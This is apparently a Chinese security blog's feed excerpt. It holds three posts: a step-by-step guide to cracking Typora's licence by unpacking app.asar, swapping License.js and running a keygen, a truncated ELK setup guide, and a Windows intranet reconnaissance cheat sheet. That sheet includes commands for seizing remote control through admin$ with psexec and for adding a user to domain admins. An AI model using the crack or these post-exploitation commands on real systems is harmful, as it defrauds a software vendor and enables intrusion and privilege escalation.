<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213212547998.png" alt="image-20220213212547998" /></p>
<h1 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h1>
<ul>
<li><code>python3</code>  环境</li>
<li><code>typroa v1.0</code></li>
</ul>
<h1 id="破解教程"><a class="anchor" href="#破解教程">#</a> 破解教程</h1>
<h2 id="typroa安装"><a class="anchor" href="#typroa安装">#</a> Typroa 安装</h2>
<p>进入官网下载安装所需的 Typroa</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudHlwb3JhLm5ldC8=">官网链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213201532908.png" alt="image-20220213201532908" /></p>
<p>双击进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213201727667.png" alt="image-20220213201727667" /></p>
<p>一路默认安装即可，安装地址如有需求可自行更改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213201808709.png" alt="image-20220213201808709" /></p>
<p>安装完成自启也可取消</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213201907812.png" alt="image-20220213201907812" /></p>
<p>可以看到此时的 Typroa 处于未激活状态</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213201952056.png" alt="image-20220213201952056" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213203822679.png" alt="image-20220213203822679" /></p>
<h3 id="项目破解"><a class="anchor" href="#项目破解">#</a> 项目破解</h3>
<h4 id="下载破解项目"><a class="anchor" href="#下载破解项目">#</a> 下载破解项目</h4>
<p>使用 GitHub 上的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01hczBuU2hpL3R5cG9yYUNyYWNrZXI="> typoraCracker</span> 项目进行破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213202137943.png" alt="image-20220213202137943" /></p>
<p>使用 git 克隆脚本文件（需配置好 git）或者直接下载即可</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#采用命令行进行 gitclone</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#打开命令行工具 (win+R 输入 cmd)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">git</span> clone https://github.com.cnpmjs.org/Mas0nShi/typoraCracker.git</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213202352897.png" alt="image-20220213202352897" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213202955646.png" alt="image-20220213202955646" /></p>
<h4 id="安装依赖项"><a class="anchor" href="#安装依赖项">#</a> 安装依赖项</h4>
<p>通过 pip 命令对 requirements.txt 文件中的依赖项进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>pip <span class="token function">install</span> -r requirements.txt -i http://pypi.douban.com/simple --trusted-host pypi.douban.com --user</pre></td></tr></table></figure><p>找到 Typora 安装目录下的 <code>resources</code>  目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213203232475.png" alt="image-20220213203232475" /></p>
<p>找到 <code>resources</code>  目录下的 <code>app.asar</code>  文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213203305874.png" alt="image-20220213203305874" /></p>
<p>默认目录是在  <code>C:\Program Files\Typora\resources\app.asar</code> ，如有更改请自行更换。</p>
<h4 id="执行解包命名"><a class="anchor" href="#执行解包命名">#</a> 执行解包命名</h4>
<p>Windows 下如果路径是有空格的，需要用 <code>&quot;&quot;</code>  包起来，如果提示权限问题，用管理员身份运行命令行，建议后续都用管理员身份执行。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token string">"C:\Program Files\Typora\resources\app.asar"</span> workstation\outfile\</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213210806446.png" alt="image-20220213210806446" /></p>
<p>使用脚本文件夹 <code>example\path\License.js</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213210914056.png" alt="image-20220213210914056" /></p>
<p>替换掉 <code>workstation\outfile\dec_app\License.js</code>  文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211003173.png" alt="image-20220213211003173" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211059864.png" alt="image-20220213211059759" /></p>
<p>打包 <code>app.asar</code>  文件</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211156023.png" alt="image-20220213211156023" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211353468.png" alt="image-20220213211353468" /></p>
<p>如遇报错:</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">|</span> ERROR <span class="token operator">|</span> __main__:packWenc:103 - plz input Directory <span class="token keyword">for</span> app.asar</pre></td></tr><tr><td data-num="2"></td><td><pre>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:</pre></td></tr><tr><td data-num="3"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">151</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre> main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">146</span>, <span class="token keyword">in</span> main</pre></td></tr><tr><td data-num="6"></td><td><pre> args.mode<span class="token punctuation">(</span>args.asarPath, args.dirPath, args.format<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  File <span class="token string">"C:\Code\mine<span class="token entity" title="\t">\t</span>yporaCracker<span class="token entity" title="\t">\t</span>ypora.py"</span>, line <span class="token number">104</span>, <span class="token keyword">in</span> packWenc</pre></td></tr><tr><td data-num="8"></td><td><pre> raise NotADirectoryError</pre></td></tr><tr><td data-num="9"></td><td><pre>NotADirectoryError</pre></td></tr></table></figure><p>手动在脚本路径下打包 <code>workstation/outappasar</code>  文件夹就行了:</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>mkdir workstation<span class="token operator">/</span>outappasar</pre></td></tr><tr><td data-num="2"></td><td><pre>python typora<span class="token punctuation">.</span>py <span class="token operator">-</span>u workstation\outfile\dec_app workstation\outappasar</pre></td></tr></table></figure><p>将打包回来的 <code>app.asar</code>  文件重新丢到 <code>Typora</code>  的 <code>resources</code>  目录下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211418146.png" alt="image-20220213211418146" /></p>
<p>如恐意外可将原文件复制一份</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211518576.png" alt="image-20220213211518576" /></p>
<h4 id="授权码生成"><a class="anchor" href="#授权码生成">#</a> 授权码生成</h4>
<p>需要安装 <code>nodejs</code>  环境，如果没有安装请自行安装。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#验证 node 安装:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">node</span> -v</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">node</span> example/keygen.js</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213211824091.png" alt="image-20220213211824091" /></p>
<h4 id="激活"><a class="anchor" href="#激活">#</a> 激活</h4>
<p>授权码输入生成的码，邮箱输入 <code>crack@example.com</code> ，完事。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213212121736.png" alt="image-20220213212121736" /></p>
<h4 id="弊端"><a class="anchor" href="#弊端">#</a> 弊端</h4>
<p>Typroa 在重新安装之后，可能会出现 pdf 导出卡顿等问题</p>
<p><strong>原因</strong></p>
<p>因为 Typroa 在删除的同时也关闭了 Print Spooler 服务</p>
<h5 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h5>
<p>在键盘上按  <code>window + r</code>  ，输入  <code>services.msc</code> ，回车</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220306181740988.png" alt="image-20220306181740988" /></p>
<p>找到  <code>Print Spooler</code>  服务，并开启该服务</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220306181826700.png" alt="image-20220306181826700" /></p>
<p><strong>设置开机自启动</strong></p>
<p>在键盘上按  <code>window + r</code>  ，输入  <code>regedit</code> ，回车</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220306181937974.png" alt="image-20220306181937974" /></p>
<p>找到以下键值：  <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler</code></p>
<p>选定  <code>Spooler</code>  这个文件夹，在右边窗口里找到  <code>DependOnService</code>  这个键值。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220306182045795.png" alt="image-20220306182045795" /></p>
<p>如果存在 <code>http</code>  将其删除，只留 <code>RPCSS</code> ，确定后退出注册表编辑器，重启计算机即可！</p>
<p><code>PS：破解后部分功能可能会出现失效情况！</code></p>
<p><code>建议使用正版！！！</code></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows上搭建ELK毫秒级响应蛇工裤记录</title>
    <url>/article/f49682ad.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>mysql 由于锁机制等等对于大量数据里查找某几条的操作是非常耗时的，索引虽然能大大加快查询的速度，但是需要新增一些内存用于存放索引，</p>
<p>ELK 是一款主流的日志平台架构，分布式，毫秒级响应的特性适用于大量数据的筛查，支持 api 接口访问，但是其缺点在于<strong>会使用源文件约 2.5 倍的空间</strong>（以空间换时间了）</p>
<h2 id="什么是elk"><a class="anchor" href="#什么是elk">#</a> 什么是 ELK：</h2>
<p>ELK 不是一款软件，而是 Elasticsearch、Logstash 和 Kibana 三种软件产品的首字母缩写。这三者都是开源软件，通常配合使用，而且又先后归于 <span class="exturl" data-url="aHR0cDovL0VsYXN0aWMuY28=">Elastic.co</span> 公司名下，所以被简称为 ELK Stack。根据 Google Trend 的信息显示，ELK Stack 已经成为目前最流行的集中式日志解决方案。</p>
<ul>
<li>
<p>Elasticsearch：分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于 Apache Lucene 构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通常被用作某些应用的基础搜索引擎，使其具有复杂的搜索功能；</p>
</li>
<li>
<p>Logstash：数据收集引擎。它支持动态的从各种数据源搜集数据，并对数据进行过滤、分析、丰富、统一格式等操作，然后存储到用户指定的位置；</p>
</li>
<li>
<p>Kibana：数据分析和可视化平台。通常与 Elasticsearch 配合使用，对其中数据进行搜索、分析和以统计图表的方式展示；</p>
</li>
</ul>
<h2 id="简单的elk架构"><a class="anchor" href="#简单的elk架构">#</a> 简单的 ELK 架构</h2>
<p>单台服务器的架构：</p>
<p>ELK 最简单的架构只需要一台机器即可架设</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309200203537.png" alt="image-20220309200203537" /></p>
<p>多台服务器分布式的日志搜集：</p>
<p>多台设备通过 logstash 搜集日志信息，发送到 ElasticSearch 服务器进行存储，再使用 Kibana 平台进行可视化分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309200320593.png" alt="image-20220309200320593" /></p>
<h2 id="安装部署"><a class="anchor" href="#安装部署">#</a> 安装部署</h2>
<h3 id="环境准备"><a class="anchor" href="#环境准备">#</a> 环境准备：</h3>
<ul>
<li>
<p>java7 以上环境</p>
</li>
<li>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnRpZmFjdHMuZWxhc3RpYy5jby9kb3dubG9hZHMvZWxhc3RpY3NlYXJjaC9lbGFzdGljc2VhcmNoLTYuNS40LnppcA==">elasticsearch-6.5.4 下载地址</span></p>
</li>
<li>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnRpZmFjdHMuZWxhc3RpYy5jby9kb3dubG9hZHMva2liYW5hL2tpYmFuYS02LjUuNC13aW5kb3dzLXg4Nl82NC56aXA=">kibana-6.5.4 下载地址</span></p>
</li>
<li>
<p><span class="exturl" data-url="aHR0cHM6Ly9hcnRpZmFjdHMuZWxhc3RpYy5jby9kb3dubG9hZHMvbG9nc3Rhc2gvbG9nc3Rhc2gtOC4wLjEtd2luZG93cy14ODZfNjQuemlw">logstash-8.0.1 下载地址</span></p>
</li>
</ul>
<h3 id="开始安装"><a class="anchor" href="#开始安装">#</a> 开始安装</h3>
<p>解压三个压缩包</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310180441435.png" alt="image-20220310180441435" /></p>
<p>进入 <code>/elasticsearch-6.5.4/bin/</code>  ，运行 <code>elasticsearch.bat</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310180557168.png" alt="image-20220310180557168" /></p>
<p>浏览器访问 <code>http://127.0.0.1:9200/</code>  如下即成功:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310190308804.png" alt="image-20220310190308804" /></p>
<p>接下来进入 <code>kibana-6.5.4-windows-x86_64\bin\</code>  ，运行 <code>kibana.bat</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310185202328.png" alt="image-20220310185202328" /></p>
<p>浏览器访问 <code>http://127.0.0.1:5601</code>  端口看到以下界面说明 kibana 运行成功：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310190519234.png" alt="image-20220310190519234" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310190541258.png" alt="image-20220310190541258" /></p>
<p>使用 py 脚本生成一批测试账号密码</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">CreateQQ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    a <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span> a</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">CreatePasswd</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    e <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> e</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    e <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    qq <span class="token operator">=</span> CreateQQ<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    password <span class="token operator">=</span> CreatePasswd<span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>qq <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>qq <span class="token operator">+</span> <span class="token string">"---"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310192758666.png" alt="image-20220310192758666" /></p>
<p>进入 <code>\logstash-8.0.1\bin</code>  目录，新建编写配置文件 <code>test.conf</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220310185305597.png" alt="image-20220310185305597" /></p>
<p>输入以下内容</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>input</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows环境下信息收集与内网定位</title>
    <url>/article/fc890dcf.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320214057882.png" alt="image-20220320214057882" /></p>
<p>内网 ip 段：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>A类：10.0.0.0-10.255.255.255</pre></td></tr><tr><td data-num="2"></td><td><pre>B类：172.16.0.0-172.31.255.255</pre></td></tr><tr><td data-num="3"></td><td><pre>C类：192.168.0.0-192.168.255.255</pre></td></tr></table></figure><p>获取主机名：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">hostname</span></pre></td></tr><tr><td data-num="2"></td><td><pre>或者</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">echo</span> %COMPUTERNAME%</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320210717428.png" alt="image-20220320210717428" /></p>
<p>systeminfo：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>systeminfo <span class="token operator">|</span> <span class="token function">find</span> /i <span class="token string">"domain"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看机器在哪个域</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320210916838.png" alt="image-20220320210916838" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>systeminfo <span class="token operator">|</span> <span class="token function">find</span> /i <span class="token string">"KB"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看系统安装的补丁</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320210955790.png" alt="image-20220320210955790" /></p>
<p>wmic：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic qfe list</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看补丁详情</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211116793.png" alt="image-20220320211116793" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic process get caption, executablepath,commandline</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看进程并显示运行进程的命令语句</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211159175.png" alt="image-20220320211159175" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic process where <span class="token assign-left variable">name</span><span class="token operator">=</span>“WMIC.exe" call terminate</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#终止某个进程</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211225746.png" alt="image-20220320211225746" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic os get name,servicepackmajorversion</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#提取操作系统的 servicepack 版本</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211250353.png" alt="image-20220320211250353" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic product get name,version</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#得到安装部分应用的版本</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211608967.png" alt="image-20220320211608967" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic product where <span class="token assign-left variable">name</span><span class="token operator">=</span>“name” call uninstall /nointeractive </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#卸载名字为 name 的软件</span></pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic share get /ALL</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看共享情况</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211425807.png" alt="image-20220320211425807" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic nteventlog get path,filename, writeable</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#得到日志文件的位置</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211501520.png" alt="image-20220320211501520" /></p>
<p>sc：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>sc query <span class="token assign-left variable">state</span><span class="token operator">=</span> all</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查询系统的服务信息</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320211722625.png" alt="image-20220320211722625" /></p>
<p>net：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>建立共享链接</pre></td></tr><tr><td data-num="2"></td><td><pre>net use <span class="token punctuation">\</span>ip<span class="token punctuation">\</span>admin$ /user:“domain<span class="token punctuation">\</span>username” “password”</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#获取对方电脑的控制权，这条命令执行成功后可以执行 psexec 进行远控</span></pre></td></tr><tr><td data-num="4"></td><td><pre>net use</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#查看当前网络共享连接</span></pre></td></tr><tr><td data-num="6"></td><td><pre>net use <span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$ /delete</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#删除指定 ip 的共享链接</span></pre></td></tr><tr><td data-num="8"></td><td><pre>net use x: <span class="token punctuation">\</span>ip<span class="token punctuation">\</span>C$ /user:“domain<span class="token punctuation">\</span>username” “password”</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#将目标的 C 盘映射到本地成为 X 盘</span></pre></td></tr><tr><td data-num="10"></td><td><pre>net use x: /delete</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#删除共享的 x 盘</span></pre></td></tr><tr><td data-num="12"></td><td><pre>net share names$<span class="token operator">=</span>C:<span class="token punctuation">\</span> /unlimited</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#共享一个盘，name 为共享的名字（或许需要管理员权限）</span></pre></td></tr><tr><td data-num="14"></td><td><pre>net share</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#查看共享信息</span></pre></td></tr><tr><td data-num="16"></td><td><pre>net share ipc$</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#开启 ipc$ 共享</span></pre></td></tr><tr><td data-num="18"></td><td><pre>net share ipc$ /del</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">#删除 ipc$ 共享</span></pre></td></tr><tr><td data-num="20"></td><td><pre>net share c$ /del</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">#删除 C：共享</span></pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>添加用户输入：net user 用户名 密码（可选） /add</pre></td></tr><tr><td data-num="2"></td><td><pre>修改用户密码：net user 用户名 新密码 该命令需权限高于要修改的用户名</pre></td></tr><tr><td data-num="3"></td><td><pre>删除用户：net user 用户名 /del</pre></td></tr><tr><td data-num="4"></td><td><pre>net group “domain admins” username /add</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#在域控制器上执行这个可以讲用户加到域管理员组中。</span></pre></td></tr><tr><td data-num="6"></td><td><pre>net user username /actives:yes /domain</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#启动一个被锁定的账号</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#要有域管权限</span></pre></td></tr></table></figure><p>账号与组相关：</p>
